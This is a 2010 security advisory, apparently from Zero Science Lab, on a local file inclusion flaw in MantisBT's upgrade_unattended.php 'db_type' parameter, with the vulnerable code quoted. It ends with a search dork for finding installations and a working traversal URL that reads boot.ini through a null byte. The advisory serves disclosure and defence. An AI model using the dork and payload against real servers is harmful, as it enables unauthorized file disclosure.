@@ -1,0 +1,61 @@
+ MantisBT <=1.2.3 (db_type) Local File Inclusion Vulnerability
+
+ 
+ Vendor: MantisBT Group
+ Product web page: http://www.mantisbt.org
+ Version affected: <1.2.4
+
+ Summary: MantisBT is a free popular web-based bugtracking system. It is written in the PHP
+ scripting language and works with MySQL, MS SQL, and PostgreSQL databases and a webserver.
+ MantisBT has been installed on Windows, Linux, Mac OS, OS/2, and others. Almost any web
+ browser should be able to function as a client. It is released under the terms of the GNU
+ General Public License (GPL).
+
+ Desc: Mantis Bug Tracker suffers from a local file inlcusion/disclosure (LFI/FD) vulnerability
+ when input passed thru the "db_type" parameter (GET & POST) to upgrade_unattended.php script is
+ not properly verified before being used to include files. This can be exploited to include files
+ from local resources with directory traversal attacks and URL encoded NULL bytes.
+
+
+
+ ====================================================================================
+ --> library/adodb/adodb.inc.php
+
+ ...
+
+ 4109:
+ 4110: $file = ADODB_DIR."/drivers/adodb-".$db.".inc.php";
+ 4111: @include_once($file);
+
+ ...
+
+ ====================================================================================
+
+
+
+ Tested on: Microsoft Windows XP Professional SP3 (English)
+            Debian GNU/Linux (squeeze)
+            Apache 2.2.14 (Win32)
+            MySQL 5.1.41
+            PHP 5.3.1
+
+ Vulnerability discovered by: Gjoko 'LiquidWorm' Krstic
+                              liquidworm gmail com
+                              Zero Science Lab - http://www.zeroscience.mk
+
+ 
+ Advisory ID: ZSL-2010-4984
+ Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4984.php
+ Vendor Advisory URL: http://www.mantisbt.org/bugs/view.php?id=12607
+
+ 13.12.2010
+
+
+ PoC:
+ ----------
+
+  Dork: Copyright+MantisBT Group
+
+  LFI/FD: http://[MANTIS_ROOT_HOST]/admin/upgrade_unattended.php?db_type=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00
+
+ ----------
